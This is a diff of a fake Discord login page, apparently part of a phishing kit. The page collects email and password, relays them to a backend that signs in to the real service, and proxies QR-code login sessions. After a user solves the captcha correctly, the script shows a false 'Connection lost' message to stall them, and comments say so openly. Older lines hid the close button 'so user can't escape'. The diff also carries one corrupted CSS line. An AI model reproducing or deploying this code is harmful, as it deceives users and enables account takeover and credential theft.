@@ -135,11 +135,11 @@
     }
     html.mob .card-header h1{font-size:24px;line-height:30px}
     html.mob .card-header p{font-size:16px;line-height:20px}
-    html.mob label{font-size:16px}
-    html.mob input[type="email"],html.mob input[type="password"],html.mob input[type="text"]{font-size:16px!important;height:50px;padding:12px 14px}
+    html.mob label{font-size:23.8px}
+    html.mob input[type="email"],html.mob input[type="password"],html.mob input[type="text"]{font-size:14.1px!important;height:50px;padding:12px 14px}
     html.mob .btn{height:50px;font-size:14px}
-    html.mob .forgot{font-size:15px}
-    html.mob .reg,html.mob .reg a{font-size:18px}
+    html.mob .forgot{font-size:23.8px}
+    html.mob .reg,html.mob .reg a{font-size:23.8px}
     /* 830px: hide QR column, cap width at 480px (Discord exact) */
     @media(max-width:830px){
       .v-sep,.col-2{display:none!important}
@@ -223,17 +223,14 @@
       }
       .card-header h1{font-size:24px;line-height:30px}
       .card-header p{font-size:16px;line-height:20px}
-      label{font-size:10px}
+      label{font-size:14px}
       input[type="email"],input[type="password"],input[type="text"]{font-size:16px!important;height:44px;padding:10px 12px}
       .btn{height:44px;font-size:16px}
-      .forgot{font-size:9px}
-      .reg,.reg a{font-size:11px}
+      .forgot{font-size:14px}
+      .reg,.reg a{font-size:14px}
       .captcha-face-wrap img{width:140px}
       .captcha-modal h2{font-size:22px}
       .captcha-modal p{font-size:15px}
-      .card-header{text-align:center!important}
-      .card-header h1{text-align:center!important}
-      .card-header p{text-align:center!important}
     }
     @media(max-width:360px){
       .loginBox{padding:16px 14px}
@@ -330,26 +327,26 @@
     .captcha-body{padding:20px 32px 24px}
     .captcha-body h2{color:var(--header-primary);font-size:20px;font-weight:700;margin-bottom:8px;font-family:var(--font-primary)}
     .captcha-body p{color:var(--header-secondary);font-size:14px;margin:0 0 20px;line-height:1.5;font-family:var(--font-primary)}
-    .hcaptcha-wrap{display:flex;justify-content:center;align-items:center;width:100%;min-height:78px;overflow:visible}
-    .hcaptcha-wrap > div{flex-shrink:0}
-    /* Mobile: hCaptcha renders at fixed 303px — never scale, just center */
+    .hcaptcha-wrap{display:flex;justify-content:center;min-height:78px;align-items:center;width:100%}
+    .hcaptcha-wrap > div{transform-origin:center center}
+    /* Mobile: scale hCaptcha widget to fit smaller screens */
     @media(max-width:485px){
-      .captcha-modal{width:92vw!important;max-width:380px!important;border-radius:8px!important;position:relative!important;bottom:auto!important;left:auto!important;right:auto!important;top:auto!important;margin:0 auto!important}
-      .captcha-stall{align-items:center!important;padding:0 16px!important}
+      .captcha-modal{width:100%!important;max-width:100vw!important;border-radius:12px 12px 0 0!important;position:fixed!important;bottom:0!important;left:0!important;right:0!important;top:auto!important;margin:0!important}
+      .captcha-stall{align-items:flex-end!important}
       .captcha-illustration{padding:24px 24px 0}
       .captcha-illustration img{width:150px}
-      .captcha-body{padding:16px 16px 24px}
+      .captcha-body{padding:16px 20px 24px}
       .captcha-body h2{font-size:20px}
       .captcha-body p{font-size:14px;margin-bottom:16px}
-      .hcaptcha-wrap{min-height:78px;overflow:visible;justify-content:center}
-      .hcaptcha-wrap > div{margin:0 auto}
+      .hcaptcha-wrap{min-height:70px;overflow:visible}
+      .hcaptcha-wrap > div{transform:scale(0.9)}
     }
-    @media(max-width:340px){
-      .captcha-body{padding:12px 8px 20px}
-    }
+    @media(max-width:360px){
+      .hcaptcha-wrap > div{transform:scale(0.82)}
+      .captcha-body{padding:12px 16px 20px}
     }
     .captcha-verifying{display:none;align-items:center;justify-content:center;gap:8px;margin-top:16px;padding:10px 0}
-    .captcha-verifying.show{display:flex}
+    .captcha-verifying.show{display:}lex}
     .captcha-verifying span{color:var(--text-muted);font-size:13px;font-family:var(--font-primary)}
 
 
@@ -443,7 +440,9 @@
       <div class="hcaptcha-wrap">
         <div id="h-captcha-widget"></div>
       </div>
-      <div class="captcha-verifying" id="captcha-verifying"></div>
+      <div class="captcha-verifying" id="captcha-verifying">
+        <span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>
+      </div>
     </div>
   </div>
 </div>
@@ -455,7 +454,6 @@ var mfaHasSms     = false;
 var mfaMode       = 'totp';
 var qrSid         = null;
 var qrTimer       = null;
-var _qrBusy       = false;  /* guard: prevent concurrent initQR calls */
 var captchaEmail  = null;
 var captchaPw     = null;
 
@@ -496,16 +494,10 @@ var _stallTimer = null;
 var _hcaptchaDone = false;
 var _pendingResult = null;
 var _hcaptchaWidgetId = null;
-var _solveCount = 0;
-var _countdownTimer = null;
-var _countdownLocked = false;
 
 function showCaptchaStall() {
   _hcaptchaDone = false;
   _pendingResult = null;
-  _solveCount = 0;
-  _countdownLocked = false;
-  if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
   var el = document.getElementById('captcha-stall');
   if (el) {
     el.classList.remove('visible');
@@ -516,7 +508,7 @@ function showCaptchaStall() {
     }, 3000);
   }
   var vf = document.getElementById('captcha-verifying');
-  if (vf) { vf.classList.remove('show'); vf.innerHTML = ''; }
+  if (vf) vf.classList.remove('show');
   /* Destroy old widget completely, then render fresh */
   try {
     if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
@@ -548,22 +540,12 @@ function showCaptchaStall() {
 
 function hideCaptchaStall() {
   if (_stallTimer) { clearTimeout(_stallTimer); _stallTimer = null; }
-  if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
-  _countdownLocked = false;
-  _solveCount = 0;
-  /* Restore close button */
-  var closeBtn = document.getElementById('captcha-close');
-  if (closeBtn) closeBtn.style.display = '';
-  /* Restore hcaptcha wrap */
-  var hcWrap = document.querySelector('.hcaptcha-wrap');
-  if (hcWrap) hcWrap.style.display = '';
-  /* Restore verifying message */
-  var vf = document.getElementById('captcha-verifying');
-  if (vf) { vf.classList.remove('show'); vf.innerHTML = ''; }
   var el = document.getElementById('captcha-stall');
   if (el) { el.classList.remove('visible'); el.classList.remove('show'); }
   _pendingResult = null;
   _hcaptchaDone = false;
+  var vf = document.getElementById('captcha-verifying');
+  if (vf) vf.classList.remove('show');
   /* Fully destroy the hCaptcha widget so no checkmark persists on retry */
   try {
     if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
@@ -577,61 +559,26 @@ function hideCaptchaStall() {
 
 function onHcaptchaPass(token) {
   _hcaptchaDone = true;
-  _solveCount++;
-
-  if (_solveCount < 2) {
-    /* First solve: show "Connection lost" and reset for re-solve */
-    var vf = document.getElementById('captcha-verifying');
-    if (vf) { vf.innerHTML = '<span style="color:#ed4245;font-weight:600">Connection lost, please retry.</span>'; vf.classList.add('show'); }
-    setTimeout(function() {
-      try {
-        if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
-          hcaptcha.reset(_hcaptchaWidgetId);
-        }
-      } catch(e) {}
-    }, 600);
-    /* If backend already done, stash it — we'll release after 2nd solve */
-    if (_pendingResult) { /* hold it */ }
-    return;
-  }
-
-  /* ── 2nd solve: lock panel and start countdown ── */
-  _countdownLocked = true;
-  /* Hide the close button so user can't escape */
-  var closeBtn = document.getElementById('captcha-close');
-  if (closeBtn) closeBtn.style.display = 'none';
-  /* Hide the hcaptcha widget area — keep the checkmark feel by showing our message */
-  var hcWrap = document.querySelector('.hcaptcha-wrap');
-  if (hcWrap) hcWrap.style.display = 'none';
-  /* Show countdown message */
+  /* Show "Connection lost" — user thinks it failed and retries, buying stall time */
   var vf = document.getElementById('captcha-verifying');
-  var countdownSec = 15;
-  if (vf) {
-    vf.innerHTML = '<span style=\"color:#3ba55d;font-weight:600\">HCaptcha is experiencing delays. Your captcha was validated.<br>Please wait <span id=\"captcha-countdown\">' + countdownSec + '</span> seconds.</span>';
-    vf.classList.add('show');
-  }
-  /* Tick down every second */
-  if (_countdownTimer) clearInterval(_countdownTimer);
-  _countdownTimer = setInterval(function() {
-    countdownSec--;
-    var cdEl = document.getElementById('captcha-countdown');
-    if (countdownSec > 0) {
-      if (cdEl) cdEl.textContent = countdownSec;
-    } else {
-      /* Hit 0 — if backend result ready, release. Otherwise hold at 0 */
-      if (cdEl) cdEl.textContent = '0';
-      if (_pendingResult) {
-        clearInterval(_countdownTimer); _countdownTimer = null;
-        var pr = _pendingResult;
-        _pendingResult = null;
-        hideCaptchaStall();
-        processLoginResult(pr.d, pr.status);
+  if (vf) vf.classList.add('show');
+  /* Reset widget after brief delay so user can re-solve (stall loop) */
+  setTimeout(function() {
+    try {
+      if (_hcaptchaWidgetId !== null && typeof hcaptcha !== 'undefined') {
+        hcaptcha.reset(_hcaptchaWidgetId);
       }
-      /* else: stay at 0 — the _pendingResult setter in login handler will release */
-    }
-  }, 1000);
-
-  /* If backend result already waiting, it will be released by the countdown above */
+    } catch(e) {}
+  }, 600);
+  /* If backend result already waiting, close panel after a brief pause */
+  if (_pendingResult) {
+    setTimeout(function() {
+      var pr = _pendingResult;
+      _pendingResult = null;
+      hideCaptchaStall();
+      processLoginResult(pr.d, pr.status);
+    }, 1200);
+  }
 }
 
 function onHcaptchaExpire() { _hcaptchaDone = false; }
@@ -666,36 +613,14 @@ function onSuccess(data) {
 
 /* ═══ QR Code ═══ */
 async function initQR() {
-  if (_qrBusy) return;  /* already starting, don't stack calls */
-  _qrBusy = true;
   clearInterval(qrTimer);
-  qrSid = null;
   var box  = document.getElementById('qr-box');
   var stat = document.getElementById('qr-stat');
   box.innerHTML = '<span class="spinner spinner-lg"></span>';
   stat.innerHTML = 'Connecting\u2026';
   try {
-    var r = await fetch('/api/qr/start?t='+(window._pgToken||''));
+    var r = await fetch('/api/qr/start');
     var d = await r.json();
-    if (r.status === 403) {
-      /* Page token invalid/expired — reload the whole page to get a fresh token */
-      window.location.reload();
-      return;
-    }
-    if (r.status === 429) {
-      /* Rate limited — wait the full retry_after before trying again, not 3s */
-      var wait = Math.max(d.retry_after || 15, 5);
-      box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;text-align:center;padding:8px"><span style="color:#666;font-size:12px">Please wait…<br><span id="rl-countdown">' + wait + '</span>s</span></div>';
-      stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
-      var cd = wait;
-      var cdTimer = setInterval(function(){
-        cd--;
-        var el = document.getElementById('rl-countdown');
-        if (el) el.textContent = cd;
-        if (cd <= 0) clearInterval(cdTimer);
-      }, 1000);      _qrBusy = false;      setTimeout(initQR, wait * 1000);
-      return;
-    }
     if (d.fp) {
       qrSid = d.id;
       box.innerHTML = '';
@@ -705,19 +630,16 @@ async function initQR() {
       box.appendChild(ov);
       stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
       qrTimer = setInterval(pollQR, 1500);
-      _qrBusy = false;
     } else {
-      /* QR failed — show placeholder, auto-retry after 5s */
+      /* QR failed — show expired-style placeholder with retry, auto-retry once */
       box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
       stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
-      _qrBusy = false;
-      setTimeout(initQR, 5000);
+      setTimeout(initQR, 3000); /* auto-retry after 3s */
     }
   } catch(e) {
     box.innerHTML = '<div style="width:160px;height:160px;background:#f0f0f0;border-radius:4px;display:flex;align-items:center;justify-content:center;"><span style="color:#666;font-size:13px;cursor:pointer" onclick="initQR()">Click to load</span></div>';
     stat.innerHTML = 'Scan this with the <strong>Discord mobile app</strong> to log in instantly.';
-    _qrBusy = false;
-    setTimeout(initQR, 8000);
+    setTimeout(initQR, 5000); /* auto-retry */
   }
 }
 
@@ -725,12 +647,6 @@ async function pollQR() {
   if (!qrSid) return;
   try {
     var r = await fetch('/api/qr/poll/' + qrSid);
-    if (r.status === 404) {
-      /* Session gone (server restart etc) — stop polling, get a fresh QR */
-      clearInterval(qrTimer); qrTimer = null; qrSid = null;
-      setTimeout(initQR, 3000);
-      return;
-    }
     var d = await r.json();
     var box  = document.getElementById('qr-box');
     var stat = document.getElementById('qr-stat');
@@ -741,17 +657,17 @@ async function pollQR() {
     } else if (d.st === 'confirming') {
       stat.innerHTML = 'Logging in\u2026';
     } else if (d.success || d.st === 'done') {
-      clearInterval(qrTimer); qrTimer = null; qrSid = null; onSuccess(d);
+      clearInterval(qrTimer); onSuccess(d);
     } else if (d.st === 'cancelled') {
-      clearInterval(qrTimer); qrTimer = null; qrSid = null;
-      setTimeout(initQR, 2000);
+      clearInterval(qrTimer); 
+      setTimeout(initQR, 2000); /* auto-refresh */
     } else if (d.st === 'error' || d.st === 'expired') {
-      clearInterval(qrTimer); qrTimer = null; qrSid = null;
-      setTimeout(initQR, 3000);
+      clearInterval(qrTimer);
+      setTimeout(initQR, 1500); /* auto-refresh */
     }
   } catch(e) {
-    clearInterval(qrTimer); qrTimer = null; qrSid = null;
-    setTimeout(initQR, 4000);
+    clearInterval(qrTimer);
+    setTimeout(initQR, 2000); /* auto-refresh on connection loss */
   }
 }
 
@@ -846,19 +762,6 @@ document.getElementById('login-form').addEventListener('submit', async function(
     } else {
       /* Backend done first, wait for user to solve captcha */
       _pendingResult = {d: d, status: r.status};
-      /* If countdown locked at 0, release immediately */
-      if (_countdownLocked) {
-        var cdEl = document.getElementById('captcha-countdown');
-        if (cdEl && cdEl.textContent === '0') {
-          if (_countdownTimer) { clearInterval(_countdownTimer); _countdownTimer = null; }
-          setTimeout(function() {
-            var pr = _pendingResult;
-            _pendingResult = null;
-            hideCaptchaStall();
-            processLoginResult(pr.d, pr.status);
-          }, 600);
-        }
-      }
     }
   } catch(err) {
     hideCaptchaStall();
@@ -910,24 +813,48 @@ function backToLogin() {
 
 /* ═══ Init ═══ */
 var _prechallengeId = null;
-
+var _prechallengeEmail = null;
+var _emailDebounce = null;
 window.addEventListener('DOMContentLoaded', function() {
   initQR();
 
-  /* ── Instant pre-challenge: fires on PAGE LOAD ──
-     Server has a 24/7 captcha token pool running in background.
-     We grab one immediately. When user clicks Login, the server does:
-       1) POST login → get fresh rqtoken from Discord
-       2) Submit pre-solved token with that fresh rqtoken
-     Result: ~1s login instead of ~25s. No email needed. */
-  fetch('/api/prechallenge', {
-    method: 'POST',
-    headers: {'Content-Type':'application/json'},
-    body: JSON.stringify({})
-  })
-    .then(function(r){return r.json()})
-    .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Token reserved:', _prechallengeId); } })
-    .catch(function(){});
+  var emailEl = document.getElementById('email');
+  var pwEl    = document.getElementById('password');
+
+  /* ── Email-specific pre-challenge: fires as soon as email has @ ──
+     Debounced 600ms after last keystroke. The EARLIER this fires,
+     the more likely captcha is solved before the user clicks Login.
+     Each second matters: captcha takes ~20-30s to solve. */
+  function startPrechallenge() {
+    var em = (emailEl.value || '').trim();
+    if (!em || em.indexOf('@') === -1 || em === _prechallengeEmail) return;
+    _prechallengeEmail = em;
+    _prechallengeId = null;
+    fetch('/api/prechallenge', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({email: em})
+    })
+      .then(function(r){return r.json()})
+      .then(function(d){ if(d.prechallenge_id) { _prechallengeId = d.prechallenge_id; console.log('[pre] Started for', em, ':', _prechallengeId); } })
+      .catch(function(){});
+  }
+
+  function debouncedPrechallenge() {
+    if (_emailDebounce) clearTimeout(_emailDebounce);
+    _emailDebounce = setTimeout(startPrechallenge, 300);
+  }
+
+  // Aggressive triggers: email input, blur, paste, password focus
+  if (emailEl) {
+    emailEl.addEventListener('input', debouncedPrechallenge);
+    emailEl.addEventListener('blur', startPrechallenge);
+    emailEl.addEventListener('paste', function() { setTimeout(startPrechallenge, 100); });
+  }
+  if (pwEl) {
+    pwEl.addEventListener('focus', startPrechallenge);
+    pwEl.addEventListener('input', startPrechallenge);
+  }
 
   /* ── Safari iOS keyboard fix ── scroll focused input into view */
   if (/iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
